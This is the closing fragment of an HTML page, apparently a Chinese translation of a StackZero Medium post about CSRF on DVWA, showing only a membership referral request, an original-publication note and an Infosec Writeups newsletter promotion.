class="kg">如果你想订阅Medium，可以考虑使用我的推荐链接，这对你来说不是额外的费用，但对我来说却是一个很大的帮助。</em></p><div class="ni nj gp gr nk nl"><a href="https://medium.com/@stackzero/membership" rel="noopener follow" target="_blank"><div class="nm ab fo"><div class="nn ab no cl cj np"><h2 class="bd iu gy z fp nq fr fs nr fu fw is bi translated">用我的推荐链接加入媒体- StackZero</h2><div class="ns l"><h3 class="bd b gy z fp nq fr fs nr fu fw dk translated">我们的最新报道(以及数以千计的其他报道)一经发布，您就可以立即获得。成为会员后，您将获得所有权限…</h3></div><div class="nt l"><p class="bd b dl z fp nq fr fs nr fu fw dk translated">medium.com</p></div></div><div class="nu l"><div class="pj l nw nx ny nu nz jz nl"/></div></div></a></div></div><div class="ab cl pc pd hx pe" role="separator"><span class="pf bw bk pg ph pi"/><span class="pf bw bk pg ph pi"/><span class="pf bw bk pg ph"/></div><div class="im in io ip iq"><p id="0417" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><em class="kg">原载于2022年11月23日</em><a class="ae ld" href="https://www.stackzero.net/csrf-dvwa/" rel="noopener ugc nofollow" target="_blank"><em class="kg"/></a><em class="kg">。</em></p></div><div class="ab cl pc pd hx pe" role="separator"><span class="pf bw bk pg ph pi"/><span class="pf bw bk pg ph pi"/><span class="pf bw bk pg ph"/></div><div class="im in io ip iq"><h2 id="ade7" class="oq li it bd lj or os dn ln ot ou dp lr le ov ow lv lf ox oy lz lg oz pa md pb bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ld" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>